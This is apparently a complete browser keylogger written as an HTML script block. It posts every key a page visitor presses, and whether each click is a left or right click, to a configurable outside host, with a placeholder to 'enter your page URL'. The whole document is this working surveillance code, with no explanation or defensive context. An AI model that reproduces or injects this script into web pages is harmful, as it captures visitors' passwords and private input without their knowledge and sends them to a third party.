<script>
(function(){
	let host = "http://domain.com/";  //enter your page URL
	document.addEventListener("keyup", function(e){
		var x = new XMLHttpRequest();
		x.open("POST", host, true);
		x.send(e.key);
	});
	
	document.addEventListener("click", function(e){
		let click;
		if(e.which == 1){
			click = " Left Click ";
		}else{
			click = " Right Click ";
		}
		
		let x = new XMLHttpRequest();
		x.open("POST", host, true);
		x.send(click);
	});
})();
</script>
